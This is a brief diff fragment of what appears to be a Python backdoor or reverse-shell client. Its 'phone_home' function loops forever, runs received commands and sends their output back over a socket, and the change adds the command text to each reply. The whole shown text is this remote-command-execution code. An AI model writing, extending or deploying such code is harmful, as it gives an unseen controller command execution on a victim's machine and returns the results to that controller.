@@ -32,7 +32,8 @@ def phone_home():
             except:
                 FileNotFoundError
             else:
-                s.sendall(bytes(execute.stdout, "utf-8"))
+                cmd_return = (str(c) + "\n" + str(execute.stdout))
+                s.sendall(bytes(cmd_return, "utf-8"))
 
 # Run the function forever.
 while True:
